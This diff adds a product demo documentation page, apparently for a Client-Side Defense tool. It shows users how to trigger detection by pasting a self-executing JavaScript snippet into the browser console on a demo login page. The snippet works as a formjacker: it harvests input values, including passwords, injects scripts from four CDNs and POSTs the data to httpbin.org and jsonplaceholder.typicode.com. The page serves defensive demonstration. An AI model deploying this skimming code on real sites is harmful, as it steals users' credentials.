@@ -1,0 +1,130 @@
+---
+title: Trigger Detection
+sidebar:
+  order: 5
+  label: Trigger Detection
+---
+
+import { Aside, Code, Steps } from "@astrojs/starlight/components";
+import Screenshot from "@f5xc-salesdemos/docs-theme/components/Screenshot.astro";
+
+export const combinedScript = `// CSD Demo — Combined Detection Script
+// Triggers ALL CSD detection signals: field reads, script injection, exfiltration
+(function() {
+    console.log('='.repeat(50));
+    console.log('[CSD Demo] Combined Detection Script — Starting');
+    console.log('='.repeat(50));
+
+    // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
+    console.log('\\n[Formjack] Phase 1: Form field harvesting');
+    var inputs = document.querySelectorAll('input');
+    var harvested = {};
+    inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+    });
+    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+    // Phase 2: Inject third-party scripts from 4 CDN domains
+    console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
+    var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+    ];
+    cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.type = 'module';
+        script.onload = function() {
+            console.log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url);
+        };
+        script.onerror = function() {
+            console.log('[Supply Chain] Load attempted from ' + cdn.name);
+        };
+        document.head.appendChild(script);
+        console.log('[Supply Chain] Injected script tag: ' + cdn.name);
+    });
+
+    // Phase 3: Exfiltrate harvested data to external endpoints
+    console.log('\\n[Exfil] Phase 3: Data exfiltration');
+    var payload = JSON.stringify({
+        type: 'combined_demo',
+        credentials: harvested,
+        page: window.location.href,
+        timestamp: Date.now()
+    });
+
+    fetch('https://httpbin.org/post', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to httpbin.org');
+    });
+
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload
+    }).then(function() {
+        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+    });
+
+    // Summary
+    console.log('\\n' + '='.repeat(50));
+    console.log('[CSD Demo] Simulation complete');
+    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
+    console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+    console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
+    console.log('='.repeat(50));
+})();`;
+
+## Trigger Detection
+
+CSD monitors JavaScript behavior inside the browser. Unlike WAF or Bot Defense, you cannot trigger CSD detection with curl commands — it requires real browser-side script activity. The following combined script triggers all three CSD detection signals in a single execution: form field harvesting, third-party script injection from multiple CDN domains, and data exfiltration to external endpoints.
+
+### Run the Combined Simulation Script
+
+<Steps>
+1. Navigate to the Juice Shop **login page** at `https://botdemo.sales-demo.f5demos.com/#/login`
+
+2. Enter dummy credentials into the form fields — type `test@example.com` in the **Email** field and `P@ssword123` in the **Password** field (do not submit the form)
+
+3. Open DevTools (**F12** &rarr; **Console** tab)
+
+   <Screenshot light="/images/devtools-console-light.png" dark="/images/devtools-console-dark.png" alt="DevTools Console tab on login page" />
+
+4. Paste the following script into the console and press **Enter** — it runs automatically as a self-executing function
+
+   <Code code={combinedScript} lang="js" title="Combined Detection Script" />
+
+5. Observe the phased `[CSD Demo]` console output confirming each step: field harvesting, script injection from 4 CDN domains, and data exfiltration
+
+   <Screenshot light="/images/devtools-console-output-light.png" dark="/images/devtools-console-output-dark.png" alt="Console output after running the simulation script" />
+</Steps>
+
+<Aside type="tip">
+Detection takes **5-10 minutes** to appear on the CSD dashboard. If alerts are not yet visible after running the script, continue with the [CSD Console walkthrough](/csd/csd-console/) and check back.
+</Aside>
+
+### What the Script Does
+
+The combined simulation triggers all three CSD detection signals:
+
+| Behavior | What the Script Does | What CSD Sees |
+| --- | --- | --- |
+| **Field harvesting** | Reads values from existing `input` elements (email, password) | Scripts reading sensitive form fields — flagged High Risk |
+| **Script injection** | Appends 4 `<script>` tags loading from `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, and `ga.jspm.io` | 4 new third-party script domains on the page |
+| **Data exfiltration** | Sends harvested data via `fetch` to `httpbin.org` and `jsonplaceholder.typicode.com` | Network calls to external domains (note: fetch destinations appear as script network interactions, not in the Network domain view) |
+
+<Aside type="note">
+CSD has specific detection boundaries — for example, only page-load DOM fields are tracked and the Network view shows script-load domains only. See [Detection Boundaries](/csd/overview/#detection-boundaries) for the full list.
+</Aside>
+
+### Advanced Simulations
+
+The combined script above is a simplified 3-phase version (harvest, inject, exfiltrate) suitable for most demos. The [Attack Script Library](/csd/attack-scripts/) provides 10 targeted scripts organized by attack type, including a **Maximum Detection** stress test that adds DOM manipulation, cookie exfiltration, and image beacon channels on top of the combined script's coverage. Use the individual scripts to demonstrate specific attack categories (formjacking, digital skimming, supply chain injection, data exfiltration, DOM manipulation) in isolation.
